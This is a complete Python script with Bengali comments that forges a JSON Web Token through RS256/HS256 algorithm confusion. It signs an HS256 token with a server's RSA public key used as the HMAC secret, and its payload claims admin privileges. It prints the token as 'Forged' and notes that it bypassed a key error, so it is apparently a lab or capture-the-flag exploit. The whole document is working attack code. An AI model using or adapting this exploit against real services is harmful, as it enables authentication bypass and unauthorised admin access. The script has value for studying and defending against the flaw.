import base64
import json
import hmac
import hashlib

# ১. ডেটা এবং কি (Key) সেটআপ
public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip"

header = {
    "alg": "HS256",
    "typ": "JWT"
}

payload = {
    'username': 'admin',
    'admin': 1     # এডমিন প্রিভিলেজ ১ (True) করে দেওয়া হলো
}

# ২. Base64Url এনকোড করার ফাংশন (প্যাডিং ছাড়া)
def base64url_encode(data):
    json_str = json.dumps(data, separators=(',', ':')).encode('utf-8')
    return base64.urlsafe_b64encode(json_str).decode('utf-8').rstrip('=')

# ৩. হেডার এবং পেলোড এনকোড করা
encoded_header = base64url_encode(header)
encoded_payload = base64url_encode(payload)

# ৪. সিগনেচার তৈরি করার অংশ (মেসেজ এবং কি-কে বাইট-এ কনভার্ট করে)
signing_input = f"{encoded_header}.{encoded_payload}".encode('utf-8')
key_bytes = public_key.encode('utf-8')

# ৫. র-HMAC-SHA256 সিগনেচার জেনারেশন
signature = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
encoded_signature = base64.urlsafe_b64encode(signature).decode('utf-8').rstrip('=')

# ৬. চূড়ান্ত JWT টোকেন
jwt_token = f"{encoded_header}.{encoded_payload}.{encoded_signature}"

print("[+] Forged JWT Token (Bypassed InvalidKeyError):")
print(jwt_token)

